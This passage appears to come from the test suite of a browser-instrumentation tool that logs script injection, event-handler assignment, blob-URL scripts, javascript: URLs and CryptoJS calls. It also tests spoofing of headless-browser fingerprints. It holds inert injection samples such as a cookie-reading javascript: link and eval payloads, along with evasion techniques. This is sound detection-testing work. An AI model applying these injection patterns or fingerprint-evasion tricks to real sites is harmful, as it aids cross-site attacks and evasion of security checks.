      await page.addInitScript(`
        window.__js_unshroud_session_id = 'test-session';
        window.__js_unshroud_log = function(data) {
          window.__test_log_event(data);
        };
      `);
      await page.addInitScript(domHooksScript);

      await page.goto('about:blank');

      await page.evaluate(() => {
        const btn = document.createElement('button');
        btn.setAttribute('onclick', 'evilFunction()');
      });

      await page.waitForTimeout(100);

      const scriptInjectionEvents = events.filter(e => e.type === 'script_injection' && e.method === 'setAttribute');
      expect(scriptInjectionEvents.length).toBeGreaterThan(0);
      expect(scriptInjectionEvents[0].attributeName).toBe('onclick');
      expect(scriptInjectionEvents[0].attributeValue).toContain('evilFunction');

      await page.close();
    });

    test('should detect outerHTML with script', async () => {
      page = await browser.newPage();
      const events: any[] = [];

      await page.exposeFunction('__test_log_event', (eventJson: string) => {
        events.push(JSON.parse(eventJson));
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(`
        window.__js_unshroud_session_id = 'test-session';
        window.__js_unshroud_log = function(data) {
          window.__test_log_event(data);
        };
      `);
      await page.addInitScript(domHooksScript);

      await page.goto('about:blank');

      await page.evaluate(() => {
        const div = document.createElement('div');
        document.body.appendChild(div);
        div.outerHTML = '<div><script src="outer.js"></script></div>';
      });

      await page.waitForTimeout(100);

      const scriptInjectionEvents = events.filter(e => e.type === 'script_injection' && e.method === 'outerHTML');
      expect(scriptInjectionEvents.length).toBeGreaterThan(0);
      expect(scriptInjectionEvents[0].containsScriptTag).toBe(true);
      expect(scriptInjectionEvents[0].scriptSources).toContain('outer.js');

      await page.close();
    });

    test('should detect multiple scripts in innerHTML', async () => {
      page = await browser.newPage();
      const events: any[] = [];

      await page.exposeFunction('__test_log_event', (eventJson: string) => {
        events.push(JSON.parse(eventJson));
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(`
        window.__js_unshroud_session_id = 'test-session';
        window.__js_unshroud_log = function(data) {
          window.__test_log_event(data);
        };
      `);
      await page.addInitScript(domHooksScript);

      await page.goto('about:blank');

      await page.evaluate(() => {
        const div = document.createElement('div');
        document.body.appendChild(div);
        div.innerHTML = '<script src="script1.js"></script><script src="script2.js"></script>';
      });

      await page.waitForTimeout(100);

      const scriptInjectionEvents = events.filter(e => e.type === 'script_injection' && e.method === 'innerHTML');
      expect(scriptInjectionEvents.length).toBeGreaterThan(0);
      expect(scriptInjectionEvents[0].scriptTagCount).toBe(2);
      expect(scriptInjectionEvents[0].scriptSources).toContain('script1.js');
      expect(scriptInjectionEvents[0].scriptSources).toContain('script2.js');

      await page.close();
    });
  });

  describe('Event Handler Tracking', () => {
    const eventHandlerScript = readFileSync('./src/instrumentation/event-handler-hooks.js', 'utf-8');

    test('should track onclick property assignment on element', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(eventHandlerScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        const button = document.createElement('button');
        button.id = 'test-button';
        document.body.appendChild(button);
        button.onclick = function() { alert('clicked'); };
      });

      await page.waitForTimeout(100);

      const handlerEvents = events.filter(e => e.type === 'event_handler' && e.handlerName === 'onclick');
      expect(handlerEvents.length).toBeGreaterThan(0);
      expect(handlerEvents[0].eventType).toBe('property_set');
      expect(handlerEvents[0].method).toBe('property_assignment');
      expect(handlerEvents[0].element).toContain('button#test-button');
      expect(handlerEvents[0].handlerCode).toContain('alert');

      await page.close();
    });

    test('should track onerror property assignment on element', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(eventHandlerScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        const img = document.createElement('img');
        img.className = 'malicious-img';
        document.body.appendChild(img);
        img.onerror = function() { eval('malicious code'); };
      });

      await page.waitForTimeout(100);

      const handlerEvents = events.filter(e => e.type === 'event_handler' && e.handlerName === 'onerror');
      expect(handlerEvents.length).toBeGreaterThan(0);
      expect(handlerEvents[0].element).toContain('img.malicious-img');
      expect(handlerEvents[0].handlerCode).toContain('eval');

      await page.close();
    });

    test('should track onclick property assignment on document', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(eventHandlerScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        document.onclick = function() { console.log('clicked'); };
      });

      await page.waitForTimeout(100);

      const handlerEvents = events.filter(e => e.type === 'event_handler' && e.handlerName === 'onclick');
      expect(handlerEvents.length).toBeGreaterThan(0);
      expect(handlerEvents[0].element).toBe('document');
      expect(handlerEvents[0].handlerCode).toContain('console.log');

      await page.close();
    });

    test('should track multiple event handlers on same element', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(eventHandlerScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        const div = document.createElement('div');
        div.id = 'multi-handler';
        document.body.appendChild(div);
        div.onclick = function() { console.log('click'); };
        div.onmouseover = function() { console.log('hover'); };
        div.onmouseout = function() { console.log('out'); };
      });

      await page.waitForTimeout(100);

      const handlerEvents = events.filter(e => e.type === 'event_handler' && e.element.includes('div#multi-handler'));
      expect(handlerEvents.length).toBe(3);

      const handlerNames = handlerEvents.map(e => e.handlerName);
      expect(handlerNames).toContain('onclick');
      expect(handlerNames).toContain('onmouseover');
      expect(handlerNames).toContain('onmouseout');

      await page.close();
    });
  });

  describe('Blob URL Tracking', () => {
    const blobHooksScript = readFileSync('./src/instrumentation/blob-hooks.js', 'utf-8');

    test('should track blob creation with JavaScript content', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(blobHooksScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        void new Blob(['alert("malicious code")'], { type: 'text/javascript' });
      });

      await page.waitForTimeout(200); // Wait for FileReader async operation

      const blobEvents = events.filter(e => e.type === 'blob' && e.eventType === 'blob_create');
      expect(blobEvents.length).toBeGreaterThan(0);
      expect(blobEvents[0].blobType).toBe('text/javascript');
      expect(blobEvents[0].isJavaScript).toBe(true);
      expect(blobEvents[0].content).toContain('alert');

      await page.close();
    });

    test('should track URL.createObjectURL for blob', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(blobHooksScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        const blob = new Blob(['console.log("test")'], { type: 'application/javascript' });
        void URL.createObjectURL(blob);
      });

      await page.waitForTimeout(200);

      const blobUrlEvents = events.filter(e => e.type === 'blob' && e.eventType === 'blob_url_create');
      expect(blobUrlEvents.length).toBeGreaterThan(0);
      expect(blobUrlEvents[0].blobUrl).toMatch(/^blob:/);
      expect(blobUrlEvents[0].blobType).toBe('application/javascript');
      expect(blobUrlEvents[0].isJavaScript).toBe(true);

      await page.close();
    });

    test('should track URL.revokeObjectURL', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(blobHooksScript);
      await page.goto('about:blank');

      const blobUrl = await page.evaluate(() => {
        const blob = new Blob(['test'], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        URL.revokeObjectURL(url);
        return url;
      });

      await page.waitForTimeout(100);

      const revokeEvents = events.filter(e => e.type === 'blob' && e.eventType === 'blob_url_revoke');
      expect(revokeEvents.length).toBeGreaterThan(0);
      expect(revokeEvents[0].blobUrl).toBe(blobUrl);

      await page.close();
    });

    test('should extract content from large blob (truncated)', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(blobHooksScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        // Create 2KB of JavaScript code
        const largeCode = 'var x = 0;\n'.repeat(200);
        void new Blob([largeCode], { type: 'text/javascript' });
      });

      await page.waitForTimeout(200);

      const blobEvents = events.filter(e => e.type === 'blob' && e.eventType === 'blob_create');
      expect(blobEvents.length).toBeGreaterThan(0);
      expect(blobEvents[0].blobSize).toBeGreaterThan(1024);
      // Content is truncated to 1KB in logging
      expect(blobEvents[0].content?.length).toBeLessThanOrEqual(1024);

      await page.close();
    });

    test('should not extract content from non-JavaScript blob over 10KB', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(blobHooksScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        // Create 15KB blob
        const largeData = 'x'.repeat(15 * 1024);
        void new Blob([largeData], { type: 'image/png' });
      });

      await page.waitForTimeout(200);

      const blobEvents = events.filter(e => e.type === 'blob' && e.eventType === 'blob_create');
      expect(blobEvents.length).toBeGreaterThan(0);
      expect(blobEvents[0].blobSize).toBeGreaterThan(10240);
      expect(blobEvents[0].content).toBeNull();
      expect(blobEvents[0].isJavaScript).toBe(false);

      await page.close();
    });

    test('should integrate with script injection detection for blob URLs', async () => {
      const domHooksScript = readFileSync('./src/instrumentation/dom-hooks.js', 'utf-8');
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(blobHooksScript);
      await page.addInitScript(domHooksScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        const blob = new Blob(['eval("malicious")'], { type: 'text/javascript' });
        const blobUrl = URL.createObjectURL(blob);

        const script = document.createElement('script');
        script.src = blobUrl;
        document.body.appendChild(script);
      });

      await page.waitForTimeout(500);

      // Should have blob creation event
      const blobCreateEvents = events.filter(e => e.type === 'blob' && e.eventType === 'blob_create');
      expect(blobCreateEvents.length).toBeGreaterThan(0);

      // Should have blob URL creation event
      const blobUrlEvents = events.filter(e => e.type === 'blob' && e.eventType === 'blob_url_create');
      expect(blobUrlEvents.length).toBeGreaterThan(0);

      // Should have script injection event with blob URL
      const scriptInjectionEvents = events.filter(e => e.type === 'script_injection' && e.isBlobUrl === true);
      expect(scriptInjectionEvents.length).toBeGreaterThan(0);
      expect(scriptInjectionEvents[0].scriptSrc).toMatch(/^blob:/);
      // Decoded content from blob map may or may not be available depending on FileReader timing
      // This is acceptable - the important part is that we detect the blob URL
      if (scriptInjectionEvents[0].decodedContent) {
        expect(scriptInjectionEvents[0].decodedContent).toContain('eval');
      }

      await page.close();
    });
  });

  describe('JavaScript URL Execution Tracking', () => {
    const urlExecutionScript = readFileSync('./src/instrumentation/url-execution-hooks.js', 'utf-8');

    // Note: location.href, location.assign, and location.replace are blocked by Chromium
    // security when setting to javascript: URLs. These tests are skipped but the hooks
    // ARE in place and would work if the browser allowed it.
    test.skip('should track location.href with javascript: URL', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(urlExecutionScript);
      await page.goto('about:blank');

      // Try to set location.href to javascript: URL
      // This will be blocked by browser security but we should still log it
      await page.evaluate(() => {
        try {
          location.href = 'javascript:alert("malicious")';
        } catch {
          // Expected to fail due to browser security
        }
      });

      await page.waitForTimeout(100);

      const urlEvents = events.filter(e => e.type === 'url_execution' && e.eventType === 'location_href_set');
      expect(urlEvents.length).toBeGreaterThan(0);
      expect(urlEvents[0].url).toBe('javascript:alert("malicious")');
      expect(urlEvents[0].code).toBe('alert("malicious")');

      await page.close();
    });

    test.skip('should track location.assign with javascript: URL', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(urlExecutionScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        try {
          location.assign('javascript:console.log("assigned")');
        } catch {
          // Expected to fail
        }
      });

      await page.waitForTimeout(100);

      const urlEvents = events.filter(e => e.type === 'url_execution' && e.eventType === 'location_assign');
      expect(urlEvents.length).toBeGreaterThan(0);
      expect(urlEvents[0].url).toBe('javascript:console.log("assigned")');
      expect(urlEvents[0].code).toBe('console.log("assigned")');

      await page.close();
    });

    test.skip('should track location.replace with javascript: URL', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(urlExecutionScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        try {
          location.replace('javascript:eval("malware")');
        } catch {
          // Expected to fail
        }
      });

      await page.waitForTimeout(100);

      const urlEvents = events.filter(e => e.type === 'url_execution' && e.eventType === 'location_replace');
      expect(urlEvents.length).toBeGreaterThan(0);
      expect(urlEvents[0].url).toBe('javascript:eval("malware")');
      expect(urlEvents[0].code).toBe('eval("malware")');

      await page.close();
    });

    test('should track anchor.href with javascript: URL', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(urlExecutionScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        const link = document.createElement('a');
        link.id = 'malicious-link';
        document.body.appendChild(link);
        link.href = 'javascript:void(document.cookie)';
      });

      await page.waitForTimeout(100);

      const urlEvents = events.filter(e => e.type === 'url_execution' && e.eventType === 'anchor_href_set');
      expect(urlEvents.length).toBeGreaterThan(0);
      expect(urlEvents[0].url).toBe('javascript:void(document.cookie)');
      expect(urlEvents[0].code).toBe('void(document.cookie)');
      expect(urlEvents[0].element).toContain('a#malicious-link');

      await page.close();
    });

    test('should decode URL-encoded javascript: URL', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(urlExecutionScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        const link = document.createElement('a');
        document.body.appendChild(link);
        // URL-encoded: alert("test")
        link.href = 'javascript:alert%28%22test%22%29';
      });

      await page.waitForTimeout(100);

      const urlEvents = events.filter(e => e.type === 'url_execution');
      expect(urlEvents.length).toBeGreaterThan(0);
      expect(urlEvents[0].code).toBe('alert("test")');

      await page.close();
    });

    test('should not log non-javascript URLs', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
      });

      await page.addInitScript(bootstrapScript);
      await page.addInitScript(urlExecutionScript);
      await page.goto('about:blank');

      await page.evaluate(() => {
        const link = document.createElement('a');
        document.body.appendChild(link);
        link.href = 'https://example.com';

        try {
          location.href = 'https://example.com';
        } catch {
          // Expected
        }
      });

      await page.waitForTimeout(100);

      const urlEvents = events.filter(e => e.type === 'url_execution');
      expect(urlEvents.length).toBe(0);

      await page.close();
    });
  });

  describe('Fingerprinting Countermeasures', () => {
    let headlessMitigationScript: string;
    const fixturesPath = join(__dirname, 'fixtures');

    beforeAll(() => {
      headlessMitigationScript = readFileSync(
        join(__dirname, '..', 'src', 'instrumentation', 'headless-mitigation.js'),
        'utf-8'
      );
    });

    test('audio fingerprinting mitigation', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        (window as any).__js_unshroud_session_id = 'test-session';
      });

      await page.addInitScript(headlessMitigationScript);
      await page.goto(`file://${fixturesPath}/audio-fingerprint-test.html`);
      await page.waitForTimeout(2000); // Wait for audio rendering

      const audioEvents = events.filter(e =>
        e.type === 'headless_mitigation' &&
        (e.operation === 'audio_noise_injection' || e.operation === 'audio_samplerate_spoofed')
      );
      expect(audioEvents.length).toBeGreaterThan(0);

      // Verify AudioContext sampleRate is spoofed
      const sampleRate = await page.evaluate(() => {
        const ctx = new AudioContext();
        return ctx.sampleRate;
      });
      expect(sampleRate).toBe(44100);

      await page.close();
    });

    test('font enumeration spoofed', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        (window as any).__js_unshroud_session_id = 'test-session';
      });

      await page.addInitScript(headlessMitigationScript);
      await page.goto(`file://${fixturesPath}/font-fingerprint-test.html`);
      await page.waitForTimeout(500);

      const result = await page.evaluate(() => {
        return {
          size: (document.fonts as any).size,
          hasArial: document.fonts.check('12px Arial'),
          hasTimes: document.fonts.check('12px Times New Roman'),
          hasCalibri: document.fonts.check('12px Calibri'), // Should be false
          hasDejaVu: document.fonts.check('12px DejaVu Sans'), // Should be false
          fontList: Array.from(document.fonts as any).map((f: any) => f.family)
        };
      });

      expect(result.size).toBe(4);
      expect(result.hasArial).toBe(true);
      expect(result.hasTimes).toBe(true);
      expect(result.hasCalibri).toBe(false); // Not in our fake list
      expect(result.hasDejaVu).toBe(false); // Linux font, not in fake list
      expect(result.fontList).toEqual(['Arial', 'Times New Roman', 'Courier New', 'Verdana']);

      const fontEvents = events.filter(e =>
        e.type === 'headless_mitigation' &&
        (e.operation === 'font_list_spoofed' || e.operation === 'font_check_spoofed')
      );
      expect(fontEvents.length).toBeGreaterThan(0);

      await page.close();
    });

    test('WebRTC blocked', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        (window as any).__js_unshroud_session_id = 'test-session';
      });

      await page.addInitScript(headlessMitigationScript);
      await page.goto(`file://${fixturesPath}/webrtc-test.html`);
      await page.waitForTimeout(500);

      const error = await page.evaluate(() => {
        try {
          new RTCPeerConnection();
          return null;
        } catch (e: any) {
          return e.name;
        }
      });

      expect(error).toBe('NotSupportedError');

      const webrtcEvents = events.filter(e =>
        e.type === 'headless_mitigation' &&
        e.operation === 'webrtc_blocked'
      );
      expect(webrtcEvents.length).toBeGreaterThan(0);

      await page.close();
    });

    test('screen dimensions spoofed', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        (window as any).__js_unshroud_session_id = 'test-session';
      });

      await page.addInitScript(headlessMitigationScript);
      await page.goto('about:blank');

      const dims = await page.evaluate(() => ({
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        pixelRatio: devicePixelRatio,
        innerWidth: window.innerWidth,
        innerHeight: window.innerHeight,
        outerWidth: window.outerWidth,
        outerHeight: window.outerHeight
      }));

      expect(dims.width).toBe(1920);
      expect(dims.height).toBe(1080);
      expect(dims.availWidth).toBe(1920);
      expect(dims.availHeight).toBe(1040);
      expect(dims.colorDepth).toBe(24);
      expect(dims.pixelDepth).toBe(24);
      expect(dims.pixelRatio).toBe(1.0);
      expect(dims.innerWidth).toBe(1280);
      expect(dims.innerHeight).toBe(720);
      expect(dims.outerWidth).toBe(1296);
      expect(dims.outerHeight).toBe(825);

      const screenEvents = events.filter(e =>
        e.type === 'headless_mitigation' &&
        e.operation === 'screen_dimension_spoofed'
      );
      expect(screenEvents.length).toBeGreaterThan(0);

      await page.close();
    });

    test('timezone spoofed', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        (window as any).__js_unshroud_session_id = 'test-session';
      });

      await page.addInitScript(headlessMitigationScript);
      await page.goto('about:blank');

      const offset = await page.evaluate(() => new Date().getTimezoneOffset());
      expect(offset).toBe(300); // US Eastern Time (-300 minutes = UTC-5)

      const timeZone = await page.evaluate(() => {
        const formatter = new Intl.DateTimeFormat();
        return formatter.resolvedOptions().timeZone;
      });
      expect(timeZone).toBe('America/New_York');

      const timezoneEvents = events.filter(e =>
        e.type === 'headless_mitigation' &&
        e.operation === 'timezone_spoofed'
      );
      expect(timezoneEvents.length).toBeGreaterThan(0);

      await page.close();
    });

    test('battery API blocked', async () => {
      page = await browser.newPage();

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        (window as any).__js_unshroud_session_id = 'test-session';
      });

      await page.addInitScript(headlessMitigationScript);
      await page.goto('about:blank');

      const result = await page.evaluate(async () => {
        // Check if getBattery exists
        if (!(navigator as any).getBattery) {
          return 'undefined';
        }

        // Try to call it
        try {
          await (navigator as any).getBattery();
          return 'success';
        } catch (e: any) {
          return e.name;
        }
      });

      expect(result).toMatch(/NotSupportedError|undefined/);

      if (result === 'NotSupportedError') {
        const batteryEvents = events.filter(e =>
          e.type === 'headless_mitigation' &&
          e.operation === 'battery_api_blocked'
        );
        expect(batteryEvents.length).toBeGreaterThan(0);
      }

      await page.close();
    });
  });

  describe('CryptoJS Instrumentation', () => {
    test('should capture AES decryption', async () => {
      page = await browser.newPage();
      await page.addInitScript(bootstrapScript);

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = {
          enableCryptoJS: true,
          maxPayloadSize: 2051
        };
        window.__js_unshroud_session_id = 'test-session';
      });

      await page.addInitScript(cryptojsHooksScript);

      await page.goto('about:blank');
      await page.waitForTimeout(200);

      await page.evaluate(() => {
        // Simulate CryptoJS library
        (window as any).CryptoJS = {
          AES: {
            decrypt: (_ciphertext: any, _key: any) => ({
              toString: (_enc: any) => 'console.log("decrypted malicious code");'
            })
          },
          enc: { Utf8: {} }
        };
      });

      await page.waitForTimeout(200);

      await page.evaluate(() => {
        const encrypted = 'U2FsdGVkX1+...';
        const decrypted = (window as any).CryptoJS.AES.decrypt(encrypted, 'secret-key');
        decrypted.toString((window as any).CryptoJS.enc.Utf8);
      });

      await page.waitForTimeout(200);

      const cryptojsEvents = events.filter(e => e.type === 'cryptojs' && e.method === 'AES.decrypt');
      expect(cryptojsEvents.length).toBeGreaterThan(0);
      expect(cryptojsEvents[0].operation).toBe('decrypt');
      expect(cryptojsEvents[0].algorithm).toBe('AES');
      expect(cryptojsEvents[0].key).toBe('secret-key');
      expect(cryptojsEvents[0].output).toContain('decrypted malicious code');

      await page.close();
    });

    test('should capture AES encryption with cleartext input', async () => {
      page = await browser.newPage();
      await page.addInitScript(bootstrapScript);

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = {
          enableCryptoJS: true,
          maxPayloadSize: 2051
        };
        window.__js_unshroud_session_id = 'test-session';
      });

      await page.addInitScript(cryptojsHooksScript);

      await page.goto('about:blank');
      await page.waitForTimeout(200);

      await page.evaluate(() => {
        // Simulate CryptoJS library
        (window as any).CryptoJS = {
          AES: {
            encrypt: (_message: any, _key: any) => ({
              toString: () => 'U2FsdGVkX1+encrypted...'
            })
          },
          enc: { Utf8: {} }
        };
      });

      await page.waitForTimeout(200);

      await page.evaluate(() => {
        const cleartext = 'this is the cleartext message to encrypt';
        (window as any).CryptoJS.AES.encrypt(cleartext, 'my-password');
      });

      await page.waitForTimeout(200);

      const cryptojsEvents = events.filter(e => e.type === 'cryptojs' && e.method === 'AES.encrypt');
      expect(cryptojsEvents.length).toBeGreaterThan(0);
      expect(cryptojsEvents[0].operation).toBe('encrypt');
      expect(cryptojsEvents[0].algorithm).toBe('AES');
      expect(cryptojsEvents[0].key).toBe('my-password');
      // Should capture cleartext INPUT, not encrypted output
      expect(cryptojsEvents[0].output).toBe('this is the cleartext message to encrypt');

      await page.close();
    });

    test('should capture encoding conversions', async () => {
      page = await browser.newPage();
      await page.addInitScript(bootstrapScript);

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = {
          enableCryptoJS: true,
          maxPayloadSize: 2051
        };
        window.__js_unshroud_session_id = 'test-session';
      });

      await page.addInitScript(cryptojsHooksScript);

      await page.goto('about:blank');
      await page.waitForTimeout(200);

      await page.evaluate(() => {
        // Simulate CryptoJS library
        (window as any).CryptoJS = {
          enc: {
            Base64: {
              stringify: (_wordArray: any) => 'SGVsbG8gV29ybGQ=',
              parse: (_str: any) => ({
                toString: (_enc: any) => 'Hello World'
              })
            },
            Utf8: {}
          }
        };
      });

      await page.waitForTimeout(200);

      await page.evaluate(() => {
        const wordArray = { words: [1, 2, 3] };
        (window as any).CryptoJS.enc.Base64.stringify(wordArray);
        const parsed = (window as any).CryptoJS.enc.Base64.parse('SGVsbG8gV29ybGQ=');
        parsed.toString((window as any).CryptoJS.enc.Utf8);
      });

      await page.waitForTimeout(200);

      const stringifyEvents = events.filter(e => e.type === 'cryptojs' && e.method === 'enc.Base64.stringify');
      expect(stringifyEvents.length).toBeGreaterThan(0);
      expect(stringifyEvents[0].operation).toBe('stringify');
      expect(stringifyEvents[0].encoding).toBe('Base64');

      const parseEvents = events.filter(e => e.type === 'cryptojs' && e.method === 'enc.Base64.parse');
      expect(parseEvents.length).toBeGreaterThan(0);
      expect(parseEvents[0].operation).toBe('parse');
      expect(parseEvents[0].encoding).toBe('Base64');
      expect(parseEvents[0].output).toBe('Hello World');

      await page.close();
    });

    test('should capture multiple algorithms', async () => {
      page = await browser.newPage();
      await page.addInitScript(bootstrapScript);

      const events: any[] = [];
      await page.exposeFunction('__test_log_event', (event: string) => {
        events.push(JSON.parse(event));
      });

      await page.addInitScript(() => {
        window.__js_unshroud_log = (data: string) => {
          (window as any).__test_log_event(data);
        };
        window.__js_unshroud_config = {
          enableCryptoJS: true,
          maxPayloadSize: 2051
        };
        window.__js_unshroud_session_id = 'test-session';
      });

      await page.addInitScript(cryptojsHooksScript);

      await page.goto('about:blank');
      await page.waitForTimeout(200);

      await page.evaluate(() => {
        // Simulate CryptoJS library with multiple algorithms
        (window as any).CryptoJS = {
          AES: {
            decrypt: (_ciphertext: any, _key: any) => ({
              toString: (_enc: any) => 'AES decrypted'
            })
          },
          DES: {
            decrypt: (_ciphertext: any, _key: any) => ({
              toString: (_enc: any) => 'DES decrypted'
            })
          },
          RC4: {
            decrypt: (_ciphertext: any, _key: any) => ({
              toString: (_enc: any) => 'RC4 decrypted'
            })
          },
          enc: { Utf8: {} }
        };
      });

      await page.waitForTimeout(200);

      await page.evaluate(() => {
